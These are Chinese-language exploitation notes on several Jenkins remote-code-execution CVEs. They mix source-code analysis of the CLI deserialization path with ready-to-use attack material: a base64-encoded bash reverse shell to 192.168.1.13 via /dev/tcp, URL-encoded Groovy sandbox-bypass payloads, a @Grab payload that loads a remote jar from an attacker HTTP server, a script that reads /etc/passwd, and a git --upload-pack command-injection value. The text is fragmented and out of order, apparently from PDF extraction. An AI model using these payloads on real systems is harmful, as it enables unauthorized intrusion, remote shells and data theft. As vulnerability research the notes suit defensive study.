漏洞复现
⾸先⽣成反序列化 payload 
利⽤ exp 直接进⾏反弹shell
python3 exploit.py http://localhost:8080 poc.ser
漏洞分析
漏洞触发还是和cli有关系，我们来详细看看，⾸先⼊⼝在 hudson.cli.CLIAction , 从源码中可看出会从 header 中
的 side 值来区分是 download 还是 upload ，然后通过 uuid 来区分不同的通道，⾸先会进⼊ download 
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar poc.ser 'bash -c 
{echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTMvOTA5MCAwPiYxIg==}|
{base64,-d}|{bash,-i}'
在 download ⽅法中会阻塞，直到等到 upload 
跟进 Channel ⽅法 ，同样的会将输⼊输出传递到 negotiate 函数中
在negotiate中调⽤⾥ makeTransport ⽅法 
在 makeTransport ⽅法中会先判断是否⽀持 Chunked ,然后返回到构造函数 
重新回到 Channel 的构造函数 ，看到这⾥将⾃身以及 CommandReceiver 作为参数传⼊了 setup ⽅法， 但是这
⾥的 setup 是⼀个抽象⽅法 
⽽setup也是⼀个抽象类，会调⽤ hudson.remoting.SynchronousCommandTransport#setup 这个会启动⼀
个ReaderThread 线程来处理传⼊的CommandReceiver对象，这⾥通过 start 来进⾏线程的启动，在 run ⽅法
中调⽤了 read ⽅法
此处的 read 为抽象⽅法，其实现⽅法在 hudson.remoting.ClassicCommandTransport
跟进 readForm 发现会对输⼊流进⾏反序列化
[常⻅]CVE-2018-1000861 远程命令执⾏
影响版本
Jenkins & 
/dev/tcp/192.168.1.13/9090 0>&1"  
成功收到反弹的shell
命令执⾏：
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox
.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%20%20%20%20%22touch%20%2Ftmp
%2Fsuccess%22.execute()%0A%20%20%7D%0A%7D
http://localhost:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.s
criptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?
sandbox=true&value=public%20class%20x%20%7B%0A%20%20public%20x()%7B%0A%20%20%20%20%22ba
sh%20-
c%20%7Becho%2CYmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTMvOTA5MCAwPiYxIgo
%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute()%0A%20%20%7D%0A%7D
[常⻅]CVE-2019-1003000系列插件远程代码执⾏
https://anquan.baidu.com/article/631
影响版本
在 Jenkins  2.138 需
要普通⽤户权限才可以利⽤该漏洞
实际影响版本编号：
CVE-2019-1003000/1003005/1003029 (Script Security) ：Script Security Plugin <= 1.53
CVE-2019-1003001 (Pipeline: Groovy)： Pipeline: Groovy Plugin <= 2.61
CVE-2019-1003002 (Pipeline: Declarative):   Pipeline: Declarative Plugin <= 1.3.3
漏洞检测
可以利⽤ orange 的脚本来进⾏检测 
脚本链接：https://github.com/orangetw/awesome-jenkins-rce-2019
在脚本中⾸先会判断我们能否进⾏匿名读取，如果不能就会利⽤bypass尝试绕过(bypass适⽤版本 <= 2.137) 
如果可以进⾏匿名读取则会有如下特征
RCE
这⾥有两种⽅法，⼀种是远程加载 jar 包来实现rce ，另⼀种是通过知道账号密码即低权限的情况下才需要
远程下载 Jar 包
该⽅法⽐较通⽤
利⽤远程加载 jar 包从⽽ getshell，链接：https://github.com/petercunha/jenkins-rce
下载好的项⽬结构是这样的 
将 payload.java 修改成我们⾃⼰的内容，然后运⾏ build.sh 进⾏打包，然后利⽤ python 开⼀个 http 服务器
ps：在 www ⽂件夹下开启
然后将我们的 poc 直接进⾏发送
Poc
同时修改项⽬中的 java ⽂件为我们的反弹shell的命令
http://localhost:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.w
orkflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='payload', root='http://192.168.1.13:8001')%0a
@Grab(group='package', module='payload', version='1')%0a
import Payload;
运⾏ build.sh 即可⾃动进⾏打包
接下来发送 poc 来让受害机远程加载我们的 payload
监听2333端⼝，成功监听到了，并且能执⾏命令
Script Security Plugin allows attackers with Overall/Read permission to execute 
需要有 Overall/Read 同时能配置 job 的权限
直⽩点说就是能看到⻚⾯，然后能对job进⾏配置的修改 
可直接通过脚本进⾏ RCE ，⼯具链接：https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
同时该⽅法是有回显的
⼿⼯操作如下：
import org.buildobjects.process.ProcBuilder
@Grab('org.buildobjects:jproc:2.2.3')
class Dummy{ }
print new ProcBuilder("/bin/bash").withArgs("-c","cat 
/etc/passwd").run().getOutputString()
点击⽴即构建
命令回显如下：
CVE-2019-10392 Jenkins Git 插件命令执⾏
影响版本
https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788
https://www.secpulse.com/archives/113004.html
Jenkins Git Client Plugin < 2.8.4
ps：限制条件是攻击者需要有Overall/Read  和 创建 job 的权限
漏洞利⽤
在 url 那栏添加如下 payload，即可得到命令的回显
--upload-pack="`whoami`"